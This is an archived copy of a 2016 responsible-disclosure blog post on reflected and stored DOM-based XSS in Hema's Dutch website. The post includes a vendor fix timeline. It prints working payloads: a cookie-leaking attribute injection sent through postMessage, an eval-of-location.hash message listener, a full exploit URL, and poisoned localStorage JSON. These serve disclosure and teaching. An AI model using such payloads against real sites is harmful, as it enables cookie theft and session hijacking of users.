---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2016-12-20_cross-site-scripting-on-one-of-the-largest-dutch-franchisors.md
original_filename: 2016-12-20_cross-site-scripting-on-one-of-the-largest-dutch-franchisors.md
title: Cross-site-scripting on one of the largest Dutch franchisors
category: documents
detected_topics:
- xss
- command-injection
- api-security
tags:
- imported
- documents
- xss
- command-injection
- api-security
language: en
raw_sha256: b31a52750d3b03325d16ea177159381ee864af56880baaf7c7c2e5a1a66f2b66
text_sha256: 25f7615f54995d81ddff0aa6533866cdfad7c2582836044011dc6a1ccac44039
ingested_at: '2026-06-28T07:31:55Z'
sensitivity: unknown
redactions_applied: false
---

# Cross-site-scripting on one of the largest Dutch franchisors

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2016-12-20_cross-site-scripting-on-one-of-the-largest-dutch-franchisors.md
- Source Type: markdown
- Detected Topics: xss, command-injection, api-security
- Ingested At: 2026-06-28T07:31:55Z
- Redactions Applied: False
- Raw SHA256: `b31a52750d3b03325d16ea177159381ee864af56880baaf7c7c2e5a1a66f2b66`
- Text SHA256: `25f7615f54995d81ddff0aa6533866cdfad7c2582836044011dc6a1ccac44039`


## Content

---
title: "Cross-site-scripting on one of the largest Dutch franchisors"
url: "https://tij.me/blog/xss-on-hema-one-of-the-largest-dutch-franchisors/"
final_url: "https://tij.me/blog/xss-on-hema-one-of-the-largest-dutch-franchisors/"
authors: ["Tijme Gommers (@tijme)"]
programs: ["Hema"]
bugs: ["DOM XSS"]
publication_date: "2016-12-20"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 6237
---

# Cross-site-scripting on one of the largest Dutch franchisors

Posted on 20 December 2016 by Tijme Gommers.

By abusing a sensitive data exposure [vulnerability](https://www.owasp.org/index.php/Top_10_2013-A6-Sensitive_Data_Exposure) it is possible to steal data from a Hema user. If the user is signed in, data like the user’s name and email can be stolen using [cross frame scripting](https://www.owasp.org/index.php/Cross_Frame_Scripting). Besides that, a malicious JavaScript payload can be inserted into the local storage which causes DOM-based XSS.

> Please note that I used FireFox to test this vulnerability since browsers like Chrome, Safari and Edge have built in XSS auditors, which filter some of the reflected XSS.

[![Google Chrome's XSS auditor](/img/xss-on-hema-one-of-the-largest-dutch-franchisors/xss-auditor-block.png)](/img/xss-on-hema-one-of-the-largest-dutch-franchisors/xss-auditor-block.png)

### Proof of Concept (reflected XSS)

While examining hema.nl I found some interesting XHR calls. One of them was `ListerQuickView.aspx`, which contained a lot of GET parameters.

`http://www.hema.nl/Pages/Fredhopper/ListerQuickView.aspx?culture=nl-NL&nextProductId=pnl_60000199&prevProductId=&productId=pnl_60000198&productSku=12345`

I tried to inject JavaScript in all the parameters but it didn’t really work. Especially because they blocked all requests if the URL contained a `<` sign followed by another character. The value of one of the parameters, `productSku`, was used as an attribute value. This made it possible to execute JavaScript using the `onmousemove` event. Unfortunately the `onload` event couldn’t be used since the element it got injected in was a div.

You can find the payload I used below. The inline CSS causes the div to overlap all content (this increases the chance that `onmousemove` is triggered). The `parent.postMessage` passes the cookie to the parent frame on mouse move.

`&productSku=tes" style="width:100%;height:100%;position:absolute;top:0;left:0;" onmousemove="parent.postMessage(cookie, '*')">as`

Which resulted in the following HTML:

[![Payload in HTML](/img/xss-on-hema-one-of-the-largest-dutch-franchisors/xss-payload-in-source.jpg)](/img/xss-on-hema-one-of-the-largest-dutch-franchisors/xss-payload-in-source.jpg)

We can now place this piece of art in an iframe, which results in cross frame scripting.

### Proof of Concept (Stored DOM-based XSS)

Making it “Stored DOM-based XSS” is a bit more difficult. I divided it into two steps, bypassing the input restrictions and inserting the JavaScript payload into the local storage.

#### Bypassing Hema’s input restrictions

The DOM-based XSS vulnerability contains a little bit more code. Lets use the previous payload and edit it to look like this:

`data-message="message" style="width:100%;height:100%;position:absolute;top:0;left:0;" onmousemove="eval(location.hash.substring(1))"`

This code executes the JavaScript from the `location.hash`. I used `location.hash` since hema.nl blocks a lot of characters, like `<` and `{`, and the `location.hash` will not be included in the request, so hema.nl will never know about it.

In my location hash I wrote `#window.addEventListener(arguments[0].originalTarget.attributes[4].value,function(event){eval(event.data)})`.

I use `arguments[0].originalTarget.attributes[4].value` (where `arguments[0]` is the `onmousemove` event) to get the value of the fourth attribute of our div, which is the string `message`. I couldn’t just add the string `"message"` to `addEventListener` since quotes in the hash are converted to `%22`, which results in an unexpected `%` character.

So all this code basically sets a listener for messages on mouse move. Using cross frame scripting we can now execute all the code we want in the hema.nl iframe using `postMessage`.

`document.getElementById('hema').contentWindow.postMessage('alert(document.cookie)', '*')`

Which results in:

[![Alert on mouse over](/img/xss-on-hema-one-of-the-largest-dutch-franchisors/xss-alert-cookie.png)](/img/xss-on-hema-one-of-the-largest-dutch-franchisors/xss-alert-cookie.png)

This is the full URL that I used:

`http://www.hema.nl/Pages/Fredhopper/ListerQuickView.aspx?culture=nl-NL&nextProductId=pnl_60000199&prevProductId=&productId=pnl_60000198&productSku=tes%22%20data-message=%22message%22%20style=%22width:100%;height:100%;position:absolute;top:0;left:0;%22%20onmousemove=%22eval(location.hash.substring(1))%22%20data-test=%22as#window.addEventListener(arguments[0].originalTarget.attributes[4].value,function(event){eval(event.data)});`

#### Making it “Stored DOM-based XSS”

Hema stores some interesting JSON in the local storage. For example, they store all the products that I added to my favorites.

A product that I added to my favorites looks like this:
  
  
  {
  "imgUrl":"https://images.hema.nl/products/mok-60000198-normal.jpg",
  "imgUrlX2":"https://images.hema.nl/products/mok-60000198-normal_twox.jpg",
  "name":"mok",
  "productId":"pnl_60000198",
  "price":"3,-",
  }

And ofcourse, using our postMessage, we can edit it so it looks like this (note the `onload` in the imgUrl):
  
  
  {
  "imgUrl":"https://images.hema.nl/products/mok-60000198-normal.jpg\" onload=\"alert(document.cookie)",
  "imgUrlX2":"https://images.hema.nl/products/mok-60000198-normal_twox.jpg",
  "name":"mok",
  "productId":"pnl_60000198",
  "price":"3,-",
  }

Hema loads the favorites and shows the image without encoding the URL. Which means every time the victim navigates to hema.nl an alert will pop up.

So there you go, Stored DOM-based XSS!

[![Stored DOM-based XSS in hema.nl](/img/xss-on-hema-one-of-the-largest-dutch-franchisors/xss-stored-proof.png)](/img/xss-on-hema-one-of-the-largest-dutch-franchisors/xss-stored-proof.png)

### Domains

[www.hema.nl](http://www.hema.nl/) (vulnerable)  
[~~www.hema.fr~~](http://www.hema.fr/) (protected by CloudFlare)  
[~~www.hema.be~~](http://www.hema.be/) (not vulnerable)  
[~~www.hemashop.com~~](http://www.hemashop.com/) (not vulnerable)

### Timeline

Date| Activity  
---|---  
11 Dec 2016 18:43:34 GMT| Reported the vulnerability to Hema.  
12 Dec 2016 09:23:21 GMT| Hema is investigating the vulnerability.  
15 Dec 2016 13:54:56 GMT| Hema confirmed the vulnerability.  
Hema will be releasing a fix in week 51.  
20 Dec 2016 19:11:44 GMT| Hema fixed the vulnerability.  
20 Dec 2016 19:14:41 GMT| Public disclosure.
